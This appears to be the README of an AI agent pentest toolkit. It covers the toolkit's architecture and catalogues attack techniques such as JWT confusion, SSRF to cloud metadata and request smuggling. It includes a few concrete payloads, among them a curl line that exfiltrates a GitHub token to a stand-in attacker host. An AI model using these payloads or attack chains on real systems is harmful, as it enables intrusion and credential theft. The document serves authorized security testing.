<div align="center">

<img src="assets/banner.svg" alt="AKIRA - AI Pentest Co-Pilot" width="900"/>

[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=18&duration=2500&pause=800&color=00FF41&center=true&vCenter=true&width=700&lines=Bayesian+hypothesis+engine.+Signal-driven+attack+graph.;Thin+router+%2B+technique+library.+80%25+token+reduction.;16+skills.+68+technique+files.+Race-proof+signal+bus.;Every+attack+selected+for+scanner+blind+spots+only.)](https://github.com/kalpmodi/akira)

[![GitHub Stars](https://img.shields.io/github/stars/kalpmodi/akira?style=flat-square&color=yellow)](https://github.com/kalpmodi/akira/stargazers)
[![GitHub Forks](https://img.shields.io/github/forks/kalpmodi/akira?style=flat-square&color=blue)](https://github.com/kalpmodi/akira/network/members)
[![Last Commit](https://img.shields.io/github/last-commit/kalpmodi/akira/dev?style=flat-square&color=green)](https://github.com/kalpmodi/akira/commits/dev)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow?style=flat-square)](LICENSE)
[![Skills](https://img.shields.io/badge/skills-16-brightgreen?style=flat-square)](#skills)
[![Tech Files](https://img.shields.io/badge/technique_files-68-blue?style=flat-square)](#router-architecture)
[![CI](https://github.com/kalpmodi/akira/actions/workflows/validate-skills.yml/badge.svg?branch=dev)](https://github.com/kalpmodi/akira/actions/workflows/validate-skills.yml)

> **`dev` branch** - Basilisk v1.1.0. Stable release on `main`.

</div>

---

## What Is Akira?

An AI pentest co-pilot that runs natively inside Claude Code, Gemini CLI, Cursor, or any agent. It is not a wrapper around automated scanners. It is a structured reasoning system for finding what scanners miss: logic flaws, architecture leaks, supply chain vectors, cryptographic weaknesses, and chained attacks.

**Core constraint:** Every finding requires a reproducible HTTP response body containing sensitive data. No evidence = no finding. OOB callback alone is never Critical.

```
/plan-engagement → /recon → /secrets → /exploit → /zerodayhunt → /triage → /report
```

---

## System Architecture

### Component Graph

```
┌─────────────────────────────────────────────────────────────────────┐
│                         session.json (state bus)                    │
│  ┌──────────────┐  ┌──────────────┐  ┌───────────────────────────┐ │
│  │ engagement   │  │ intel_relay  │  │ scalpel                   │ │
│  │ .state       │  │ .from_recon  │  │ .hypotheses[]             │ │
│  │ .target      │  │ .from_secrets│  │ .active_manifest          │ │
│  │ .scope       │  │ .from_exploit│  │ .doom_loop.technique_runs │ │
│  └──────────────┘  │ .from_cloud  │  │ .snr.signal_count         │ │
│                    │ .from_redteam│  └───────────────────────────┘ │
│  ┌──────────────┐  └──────────────┘  ┌───────────────────────────┐ │
│  │ report_draft │  ┌──────────────┐  │ signals.jsonl             │ │
│  │ .findings[]  │  │ intel        │  │ (append-only, race-proof) │ │
│  │ .chains[]    │  │ .technologies│  │ {type,value,source,conf}  │ │
│  └──────────────┘  │ .live_hosts  │  └───────────────────────────┘ │
│                    │ .credentials │                                 │
│                    └──────────────┘                                 │
└─────────────────────────────────────────────────────────────────────┘
         ▲ read/write              ▲ read/write
         │                        │
┌────────┴────────────────────────┴──────────────────────────────────┐
│                       _shared/phase0.sh                            │
│  p0_init_vars()       p0_state_gate()      p0_read_relay()         │
│  p0_read_memory()     p0_read_hypotheses() p0_manifest_write()     │
│  p0_relay_write()     p0_relay_append()    p0_completion_gate()    │
└────────────────────────────────────────────────────────────────────┘
         ▲ source                  ▲ source
         │                        │
┌────────┴──────────┐   ┌─────────┴────────────────────────────────┐
│  Thin Router      │   │  Technique Library (tech/*.md)            │
│  SKILL.md         │   │  loaded on demand via manifest priority   │
│  ~180 lines       │   │  ~80 lines each                           │
│  - Phase 0        │   │  ssrf-oob.md | jwt-saml-sso.md           │
│  - Manifest build │   │  chain-blueprints.md | client-proto.md   │
│  - Loader table   │   │  ...68 total across 4 split skills        │
└───────────────────┘   └──────────────────────────────────────────┘
```

### Intel Relay Schema

```json
{
  "intel_relay": {
    "from_recon": {
      "js_bundles": ["https://t.com/static/js/home.abc123.chunk.js"],
      "github_orgs": ["corp-org"],
      "live_hosts": ["api.t.com", "admin.t.com"],
      "interesting_endpoints": ["/api/v2/user/profile", "/actuator/env"],
      "wayback_endpoints": ["/api/v1/admin/users"],
      "param_names": ["url", "redirect", "next"],
      "aws_hint": true,
      "gcp_hint": false,
      "azure_hint": false,
      "waf": "apisix"
    },
    "from_secrets": {
      "verified_creds": ["AWS:AKIA..."],
      "jwt_tokens": ["eyJhbGc..."],
      "aws_keys_found": true,
      "api_spec_endpoints": ["/api/v3/orders/{id}"],
      "postman_collections": ["corp-internal.json"]
    },
    "from_exploit": {
      "confirmed_vulns": ["IDOR on /api/v2/user/{id}"],
      "internal_ips": ["10.0.0.12", "10.0.1.5"],
      "ssrf_vectors": ["/api/fetch?url="],
      "verified_auth_bypass": false
    },
    "from_cloud_audit": {
      "cloud_creds": ["arn:aws:iam::123:role/prod-api"],
      "cloud_privesc": true,
      "cloud_data": ["s3://corp-backups/db-2024-01.sql.gz"],
      "cloud_privesc_path": "s3:GetObject -> lambda:InvokeFunction -> iam:PassRole"
    }
  }
}
```

---

## Router Architecture & Token Economics

### Why Monolithic Skills Don't Scale

Every AI inference reads the full skill into context. A monolithic `/zerodayhunt` at 1843 lines costs tokens whether or not those phases are relevant.

```
Token cost = lines × avg_tokens_per_line × cost_per_token
```

| Skill | Monolith (before) | Router + avg 2 tech files (after) | Reduction |
|---|---|---|---|
| zerodayhunt | 1843 lines ≈ 18,400 tok | 179 + 2×90 = 359 lines ≈ 3,590 tok | **80.5%** |
| exploit | 1200 lines ≈ 12,000 tok | 234 + 2×80 = 394 lines ≈ 3,940 tok | **67.2%** |
| recon | 890 lines ≈ 8,900 tok | 119 + 3×75 = 344 lines ≈ 3,440 tok | **61.3%** |
| redteam | 1100 lines ≈ 11,000 tok | 207 + 2×85 = 377 lines ≈ 3,770 tok | **65.7%** |

**Engagement-level cost (7-phase, claude-sonnet-4-6 @ $3/1M input tokens):**

```
Old:  (18400 + 12000 + 8900 + 6000 + 5000 + 4000 + 3000) tokens × $3/1M = $0.174 per engagement
New:  (3590  + 3940  + 3440 + 2100 + 1800 + 1500 + 1200) tokens × $3/1M = $0.052 per engagement

Savings: ~70% cost reduction. Over 100 engagements: $12.20 saved.
```

### Manifest Priority System

The router writes a manifest before any technique file loads. Priority determines load order and skip conditions:

```
MUST     → load unconditionally
SHOULD   → load if hypothesis probability > 0.45
IF_TIME  → load if remaining context budget > 2000 tokens
SKIP     → ATW-flagged or doom-loop detected
```

Manifest items are re-ranked after Phase 0 intel is read. Example reprioritization:

```
Initial:     [zdh03:ssrf-oob SHOULD] [zdh05:chain-blueprints MUST]
After relay: [zdh03:ssrf-oob MUST]   # AWS_HINT=true + SSRF_VECTORS found
             [zdh16:client-proto SKIP] # TECH_STACK has no Node.js
```

---

## Hypothesis Engine

### Bayesian Probability Model

Hypotheses are generated at `/plan-engagement` time from passive signals (tech stack, scope, historical pattern). They are updated in real-time as skills emit signals.

**Posterior update formula:**

```
P(H | e₁, e₂, ..., eₙ) = P(H) × ∏ P(eᵢ | H) / P(eᵢ)
```

Implemented as log-space update to avoid underflow:

```python
log_posterior = log_prior + sum(log(P(signal | H)) for signal in received_signals)
posterior = exp(log_posterior) / normalizer
```

**Signal likelihood table** `P(signal | H)`:

| Signal | H: SSRF→Cloud | H: JWT→ATO | H: Supply Chain | H: Business Logic |
|---|---|---|---|---|
| `TECH_DETECTED(AWS)` | 0.85 | 0.10 | 0.20 | 0.10 |
| `CRED_FOUND(JWT)` | 0.15 | 0.90 | 0.10 | 0.05 |
| `SURFACE_FOUND(npm_scope)` | 0.10 | 0.05 | 0.95 | 0.05 |
| `SURFACE_FOUND(SSRF_param)` | 0.90 | 0.15 | 0.10 | 0.20 |
| `TECH_DETECTED(Node.js)` | 0.25 | 0.40 | 0.35 | 0.30 |
| `TECH_DETECTED(e-commerce)` | 0.30 | 0.20 | 0.10 | 0.90 |

**Hypothesis state thresholds:**

```
P(H) < 0.15  →  mark DORMANT (skip in manifest)
P(H) ≥ 0.45  →  promote SHOULD items to MUST
P(H) ≥ 0.70  →  immediate fork spawn for that hypothesis
P(H) ≥ 0.90  →  DEEP state transition
```

### Hypothesis Struct (session.json)

```json
{
  "hypotheses": [
    {
      "id": "H1",
      "label": "SSRF -> AWS IAM credential extraction",
      "probability": 0.83,
      "prior": 0.40,
      "evidence": ["TECH_DETECTED(AWS)", "SURFACE_FOUND(url= param)", "CRED_FOUND(SSRF_vector)"],
      "skills_chain": ["recon", "exploit", "cloud-audit"],
      "status": "active",
      "confirmed": false
    }
  ]
}
```

---

## State Machine

### Formal Definition

```
States:     S = {WIDE, DEEP, HARVEST, WRAP}
Initial:    WIDE
Terminal:   WRAP

Transitions:
  WIDE    --[max(P(H)) > 0.70]--> DEEP
  WIDE    --[all P(H) < 0.15]---> HARVEST   (no surface found)
  DEEP    --[VULN_CONFIRMED]--->   HARVEST   (collect evidence, stop hunting)
  DEEP    --[SURFACE_FOUND(new)]--> WIDE     (fork spawned, re-explore)
  DEEP    --[doom_loop detected]--> WIDE     (reset, try next hypothesis)
  HARVEST --[report_draft >= 1]---> WRAP
  HARVEST --[state_timer > 2h]----> WRAP     (force wrap, no findings)
  any     --[HARVEST explicit]----> HARVEST  (manual override)
```

**State semantics:**

| State | What skills do | Techniques loaded |
|---|---|---|
| `WIDE` | Broad surface mapping, all hypotheses active | Full manifest (MUST + SHOULD) |
| `DEEP` | Focus on highest-probability hypothesis | MUST only, hypothesis-specific tech files |
| `HARVEST` | Evidence collection only, no new attack surface | Output files only |
| `WRAP` | Triage + report generation | `/triage`, `/report` only |

### Doom Loop Detection

A technique is flagged as doom-loop when `technique_runs[T] > 3` with zero new signals emitted across all runs.

```bash
SNR_threshold = new_signals / tool_runs
# SNR < 0.1 for 3 consecutive runs = doom loop
# Action: write T to scalpel.doom_loop.flagged_techniques[]
# triage ATW write-back: persist to ~/.claude/memory/ so future engagements skip T
```

---

## Signal Bus

### Race-Proof Append Protocol

`_shared/signals.sh` uses atomic shell append (`>>`) to `signals.jsonl`. Multiple concurrent skill forks can emit signals without collision - each append is a single syscall, which POSIX guarantees atomic for writes under 512 bytes.

```bash
emit_signal() {
  local type="$1" value="$2" source="$3" confidence="$4"
  local ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)
  local entry="{\"ts\":\"$ts\",\"type\":\"$type\",\"value\":\"$value\",\"source\":\"$source\",\"confidence\":$confidence}"
  echo "$entry" >> "$SIGNALS_FILE"  # atomic POSIX append
}
```

### Signal Confidence Scoring

Confidence is not binary. It's a float [0, 1] representing evidence strength:

```
0.60-0.74  POTENTIAL    - probe positive, chain unconfirmed
0.75-0.84  PROBABLE     - OOB callback or timing oracle confirms mechanism
0.85-0.92  CONFIRMED    - response body contains internal data
0.93-1.00  CRITICAL     - credentials extracted + sts:GetCallerIdentity verified
           OR           - PII response from another user's account
           OR           - RCE callback with command output
```

Finding severity is derived from confidence × impact_class, not from manual labeling.

---

## Attack Selection Rationale

Every technique in Akira was selected because automated scanners cannot find it. Each entry explains the scanner blind spot, the underlying mechanism, and why it remains unpatched at scale.

### Cryptographic Weaknesses

**JWT RS256 -> HS256 Algorithm Confusion**
Scanners check `alg: none`. They do not check algorithm confusion. The attack exploits a server that accepts both RS256 and HS256 by signing a modified payload with the RS256 *public key* as an HMAC secret. The public key is non-secret (served at `/.well-known/jwks.json`). No CVE exists because it is a design flaw in the JWT spec, not a library bug. Affects any custom JWT middleware that does not pin the algorithm server-side.

**ECDSA Nonce Reuse -> Private Key Recovery (CVE-2022-21449 + lattice attack)**
If the same random nonce `k` is used twice in ECDSA signing, the private key `d` is recoverable in closed form: `k = (h1-h2)/(s1-s2) mod n`, `d = (s1*k - h1)/r mod n`. Scanners cannot detect this without collecting 50+ tokens and running statistical analysis. CVE-2022-21449 (Psychic Signatures) is the degenerate case where `k = 0`, making verification trivially bypassable on Java JDK 15-18.

**Insecure Randomness - Math.random() State Recovery**
V8's `Math.random()` uses xorshift128+. Given 10-15 consecutive outputs, the 128-bit internal state is recoverable via Z3 constraint solver, allowing all future tokens to be predicted. Scanners test entropy of individual tokens - they do not collect sequences and test for state recovery.

### Server-Side Injection (Scanner Blind Spots)

**Prototype Pollution -> EJS/Pug RCE (USENIX Security 2023)**
Scanners fuzz parameters for XSS and SQLi. They do not test `__proto__` and `constructor.prototype` keys in JSON bodies. When a Node.js app uses `lodash.merge`, `qs`, or `deepmerge` on user input, prototype pollution can set global object properties. The EJS gadget (`outputFunctionName`) and Pug gadget (`block.type`) convert this to RCE without any additional interaction - just trigger any template render. Discovered and published at USENIX 2023, still unpatched across most Node.js deployments.

**Second-Order SSTI**
First-order SSTI (payload immediately executed) is detected by every scanner. Second-order is not: the payload is stored in step 1 (benign context), executed in step 2 (different context - email template, PDF generator, admin view). Akira tests ALL stored fields with template probes and checks every downstream rendering path, not just the immediate response.

**HTTP Request Smuggling - CL.0 and H2.CL (Black Hat 2022)**
CL.0 requires no reverse proxy - it exploits a server that ignores Content-Length on certain endpoints and returns a response before reading the body. Scanners use Burp Collaborator-style probes that require timing across two requests. CL.0 is detectable with a single-connection pause test. H2.CL exploits HTTP/2-to-HTTP/1.1 downgrade at the edge, injecting a Content-Length that disagrees with the HTTP/2 framing. Both remain unpatched because WAFs cannot distinguish them from legitimate slow clients.

### Client-Side (Post-Filter Attacks)

**mXSS via MathML Namespace Confusion (CVE-2024-47875)**
DOMPurify is the most widely deployed HTML sanitizer (50M+ sites via CDN). The sanitizer correctly identifies and removes dangerous content in HTML context. The bypass works by injecting content inside a `<math><mtext>` element, which creates a MathML parsing context. When the browser re-serializes the DOM, MathML namespace rules cause content that was safe in MathML context to be re-interpreted as dangerous HTML. The sanitizer sees clean output; the browser executes XSS. Patched in DOMPurify 3.1.3 (October 2024) but the majority of deployments have not updated.

**CSS Injection for CSRF Token Exfiltration**
Used when HTML injection is possible but JavaScript is blocked by CSP. CSS attribute selectors (`input[name=csrf][value^=a]`) combined with `url()` background requests leak token characters one at a time. Chrome 105+ `:has()` pseudo-class allows parent element targeting, making previously impossible exfil paths viable. Requires no JavaScript execution - bypasses `script-src` CSP entirely.

**Service Worker Persistence**
A service worker installed via XSS persists across page reloads, browser restarts, and cache clears. It intercepts every fetch request from that origin, allowing indefinite credential harvesting. The only removal mechanism is `navigator.serviceWorker.unregister()`. Standard XSS impact is session duration; service worker XSS is weeks-long persistent access.

### Supply Chain & CI/CD

**`pull_request_target` Secret Exposure**
GitHub Actions workflows using `pull_request_target` run in the context of the base repo (with secrets) when triggered by fork PRs. If the workflow checks out fork code (`ref: ${{ github.event.pull_request.head.sha }}`) and executes it, the fork controls arbitrary code running with access to `secrets.*`. GitHub has documented this since 2021; it remains the most common CI/CD finding in bug bounty because the footgun is subtle and the fix requires restructuring the workflow.

**Script Injection via PR Metadata**
Any workflow that interpolates `${{ github.event.pull_request.title }}` or similar fields directly into a `run:` step is injectable. The PR title is attacker-controlled. Payload: `"; curl https://attacker.com/?t=${{ secrets.GITHUB_TOKEN }}; echo "`. Scanners do not parse GitHub Actions YAML for untrusted data flows.

**Dependency Confusion (namespace squatting)**
Private registries (Nexus, Artifactory) pull from public registries first if the package version is higher. An attacker registering a package with `version: 99.0.0` under an internal namespace causes all CI builds that depend on that namespace to execute the attacker's install script. Akira requires three conditions before reporting: namespace unclaimed on public registry (API-verified), target uses the namespace internally (stack trace or build file evidence), private registry DNS confirmed.

### SSRF Escalation Chains

**PDF Generator SSRF -> AWS IMDSv1**
Headless Chrome (Puppeteer/Gotenberg) and wkhtmltopdf render HTML with full network access. An `<iframe src="http://169.254.169.254/...">` in any rendered field fetches the AWS Instance Metadata Service. IMDSv1 has no authentication requirement. The rendered PDF contains the IAM role credentials in its text layer. This chain requires no SSRF parameter - any "Export PDF" feature is a potential vector. Scanners test for SSRF in URL parameters; they do not inject into PDF content fields.

**ImageMagick tEXt Chunk Arbitrary File Read (CVE-2022-44268)**
ImageMagick reads the `profile` field from PNG `tEXt` chunks and embeds the file contents at that path into the processed image. An attacker-crafted PNG with `profile\x00/etc/passwd` causes the server to read `/etc/passwd` and embed it in the response. No command injection involved - this is a pure file read via image metadata. Scanners upload polyglot files for XSS; they do not craft PNGs with malicious metadata chunks.

**Gopher Protocol SSRF -> Redis RCE**
When SSRF reaches an internal Redis instance, the gopher:// protocol allows arbitrary TCP data to be sent. A crafted gopher URL encodes Redis commands (`SET`, `CONFIG SET dir`, `CONFIG SET dbfilename`, `SLAVEOF`) that write a cron job or SSH key to disk. This requires: (1) SSRF that allows gopher://, (2) Redis with no auth on internal network. Condition (2) is the default Redis configuration.

### Timing Oracle Attacks

**User Enumeration via Response Timing**
Authentication endpoints that hash passwords only for valid users leak existence via timing. `bcrypt` with cost factor 12 takes ~250ms; immediate rejection takes <1ms. A 20-sample mean with >20ms delta confirms user enumeration. Scanners check HTTP status codes and response body for "user not found" strings; they do not measure timing distributions.

**Blind SQLi via Heavy Query (No SLEEP)**
`SLEEP()` and `BENCHMARK()` are WAF-blocked keywords. Akira uses `SELECT 1 FROM information_schema.tables LIMIT 100000` - a legitimate heavy query with no blocked keywords that causes proportional delay when injected. The WAF sees a slow query, not an injection. Statistical significance test: 10-sample baseline vs 10-sample injection, p < 0.05 threshold.

### XS-Leaks (Cross-Site Side Channels)

Cache probing, iframe load timing, and error oracles allow inferring authenticated state without any script execution on the target. The attacker hosts a page the victim visits. The page probes whether specific resources (orders, emails, admin features) exist in the victim's browser cache. This leaks information that would otherwise require XSS: "does victim have an order with id X?", "is victim an admin?", "is victim's email registered?". Zero interaction with the target server required after the probe setup.

---

## ML Training Targets

The following components of Akira generate labeled data suitable for training specialized models:

### 1. Hypothesis Confidence Calibration

**Data:** `signals.jsonl` + `session.json.hypotheses[]` across engagements.
**Labels:** `{hypothesis_id, prior, signals_received[], final_probability, was_confirmed}`.
**Target:** Calibrate `P(signal | H)` table from empirical engagement outcomes.
**Model:** Isotonic regression on Platt-scaled classifier outputs. Train per hypothesis class, not globally.
**Feature vector:** `[tech_stack_embedding, waf_type_onehot, scope_size, prior_signal_counts[]]`

### 2. Doom Loop Prediction

**Data:** `scalpel.doom_loop.technique_runs` + `scalpel.snr.tool_runs` per technique per target.
**Labels:** `{technique, target_fingerprint, runs_before_flagged, confirmed_doom_loop}`.
**Target:** Predict after run 1 whether a technique will be flagged doom-loop on this target class.
**Model:** Gradient boosted trees (XGBoost). Low-latency required - must run in <100ms per manifest reprioritization.
**Feature vector:** `[tech_stack, waf_fingerprint, endpoint_count, prior_signal_rate, hypothesis_probability]`

### 3. WAF Bypass Selector

**Data:** WAF bypass attempt logs: `{waf_fingerprint, technique, http_status, is_real_response}`.
**Labels:** `{bypass_technique, waf_type, success_rate}`.
**Target:** Given a WAF fingerprint, rank bypass techniques by success probability.
**Model:** Multi-armed bandit with Thompson sampling. Each WAF type is an arm; each bypass technique is an action. Reward = 1 if JSON 40x/50x returned (real app response), 0 if HTML 403/empty 200 (WAF block).

### 4. Finding Severity Calibration

**Data:** `report_draft.findings[]` with `{confidence, impact_class, cvss_derived, actual_bounty}`.
**Labels:** Actual payout amounts from disclosed bug bounty reports.
**Target:** Predict bounty range from technical finding parameters.
**Model:** Ordinal regression. Output: `{low, medium, high, critical}` with calibrated probability per class.

### Training Data Generation

```bash
# Export engagement data for training:
jq '{
  target_fingerprint: .intel.technologies,
  waf: .intel.waf,
  hypotheses: .scalpel.hypotheses,
  signals: (.scalpel.snr.signal_count),
  doom_loops: .scalpel.doom_loop.flagged_techniques,
  confirmed_findings: [.report_draft.findings[] | select(.status=="confirmed")]
}' ~/pentest-toolkit/results/*/session.json > training_data.jsonl
```

---

## Skills

### Core Pipeline

| Skill | Router | Tech Files | Phase 0 Sources |
|---|---|---|---|
| `/plan-engagement` | single file | - | writes session.json |
| `/recon` | 119 lines | 14 | `_shared/phase0.sh` |
| `/secrets` | single file | - | `_shared/phase0.sh` + recon relay |
| `/exploit` | 234 lines | 20 | `_shared/phase0.sh` + recon+secrets relay |
| `/zerodayhunt` | 179 lines | 20 | `_shared/phase0.sh` + all relays |
| `/triage` | single file | - | `_shared/phase0.sh` + all relays |
| `/report` | single file | - | reads report_draft directly |

### Specialized Modules

| Skill | Phase 0 Sources | Key Techniques |
|---|---|---|
| `/redteam` | 207-line router + 14 tech files | ADCS ESC1-8, DPAPI, Pass-the-PRT, Azure Device Code phishing, OPSEC |
| `/cloud-audit` | recon + secrets relay | AWS IAM enumeration, S3 ACL audit, Cognito unauth identity, GCP SA abuse |
| `/403-bypass` | recon relay | Orange Tsai `?` ACL bypass, CVE-2025-32094, BreakingWAF 2023, JSON body traversal |
| `/oauth-attacks` | recon + secrets relay | PKCE downgrade, PAR injection, mTLS confusion, JAR bypass |
| `/race-conditions` | recon + exploit relay | HTTP/2 single-packet, limit override, TOCTOU double-spend |
| `/ctf` | isolated | web/crypto/pwn/RE/forensics/OSINT/stego - no shared state with pentest skills |
| `/compact` | reads session.json | prunes completed manifest items, compresses intel arrays |

### Technique File Index (zerodayhunt/tech/)

| File | Phases | Key Attacks |
|---|---|---|
| `waf-header-mining.md` | 2, 3, 20 | GSRM WAF pattern, 7 bypass classes, token forgery |
| `github-js-sourcemap.md` | 4, 5, 18 | webpack chunk guessing, source map extraction, git history diff |
| `supply-chain.md` | 6 | npm/Maven/PyPI namespace check, CI/CD reusable workflow injection |
| `jwt-saml-sso.md` | 7, 31 | RS256->HS256 confusion, jku/x5u injection, XSW, SAML comment injection |
| `ssrf-oob.md` | 8, 32 | 5-tier payload escalation, blind OOB timing, gopher->Redis RCE |
| `business-logic.md` | 9, 27 | Negative qty, integer overflow, mass assignment, UUID v1 prediction |
| `race-timing.md` | 10, 21 | asyncio simultaneous fire, heavy query SQLi, blind SSRF timing |
| `takeover-cloud.md` | 11, 12 | CNAME dangling check, Cognito unauth identity, Lambda URL enum |
| `mobile-apk.md` | 13 | jadx decompile, native .so string extraction, Frida runtime hook |
| `cors-host.md` | 14 | Origin reflection, null origin, password reset poisoning, cache poison |
| `ssti-deser-xxe.md` | 15 | ysoserial CommonsCollections6, Jinja2 RCE, Freemarker RCE, OOB XXE |
| `cicd.md` | 16 | pull_request_target fork RCE, script injection, self-hosted runner |
| `graphql.md` | 17 | Field suggestion (no introspection), batch rate limit bypass, mutation IDOR |
| `admin-infra.md` | 19, 28 | K8s etcd unauthenticated, CL.0 desync, H2.CL, nginx off-by-slash |
| `websocket-api.md` | 22 | CSWSH, API version discovery, internal header unlock |
| `chain-blueprints.md` | 23 | 11 confirmed attack chains A-K with evidence requirements |
| `client-proto.md` | 24, 25 | CVE-2024-47875 mXSS, DOM clobbering, CSS CSRF token theft, EJS/Pug gadgets |
| `file-crypto.md` | 26, 29 | wkhtmltopdf SSRF, CVE-2022-44268 PNG tEXt, ECDSA nonce reuse, Psychic Sigs |
| `xs-leaks.md` | 30 | Cache probe, iframe timing, error oracle, network timing (20-probe median) |
| `output.md` | - | Evidence classification, Scalpel finding format, doom loop guard |

---

## Install

```bash
git clone https://github.com/kalpmodi/akira
cd akira && bash install.sh
```

Tool dependencies (nuclei, subfinder, httpx, sqlmap, dalfox...):

```bash
bash bootstrap.sh
```

Open Claude Code, type `/plan-engagement target.com`.

---

## Proof It Works

| # | Type | Severity | Bounty | Chain |
|---|---|---|---|---|
| 1 | SSRF -> AWS IAM credential extraction | Critical | $2,500 | `/recon` -> `/exploit` -> `/cloud-audit` |
| 2 | OAuth open redirect -> auth code interception | Critical | $1,800 | `/recon` -> `/oauth-attacks` |
| 3 | Race condition: coupon applied 7x simultaneously | High | $800 | `/race-conditions` |
| 4 | Strapi SSRF bypass + MIME fail-open (CVE filed) | Critical | - | `/zerodayhunt` |
| 5 | JWT RS256->HS256 confusion -> admin access | Critical | $1,500 | `/zerodayhunt` |

---

## Roadmap

| Release | Status | Architecture Changes |
|---|---|---|
| Hydra v1.0.0 | Shipped | 12 core skills, session.json bus, 6-phase lifecycle |
| Hydra v1.0.1 | Shipped | `403-bypass`, recon 23-step pipeline |
| Hydra v1.0.2 | Shipped | Hypothesis engine, signal bus, fork scheduler, state machine |
| **Basilisk v1.1.0** | **Dev** | Thin router + technique library, 68 tech files, unified Phase 0, race-proof signals, `/redteam` |
| Raven v1.2.0 | Planned | Akira Context Engine: persistent cross-engagement memory, automatic tech fingerprint learning, `cache-attacks`, `csp-bypass` |
| Phantom v1.3.0 | Planned | `mobile` DAST integration, `burp-mcp` live traffic feed into session.json |
| Leviathan v2.0.0 | Planned | Autonomous orchestration: Akira Brain spawns and coordinates skills without user `/commands`, trained doom-loop predictor, `postmap-recon` |

---

## Contributing

Technique files in `tech/` are ~80 lines and self-contained. Adding a new attack vector is a single file PR - no monolith editing.

Contribution targets with highest value:
- New `tech/` files for emerging CVEs (within 30 days of public disclosure)
- Doom loop predictor training data (sanitized engagement exports)
- WAF bypass success rate data for the bandit model
- Platform adapters for new AI coding environments

See [CONTRIBUTING.md](CONTRIBUTING.md).

---

## Legal

Authorized security testing only - bug bounty programs, systems you own, CTF competitions. Unauthorized use is illegal. Authors not responsible for misuse.

---

<div align="center">

**[Star to follow updates](https://github.com/kalpmodi/akira)** - new technique files ship as CVEs drop.

</div>
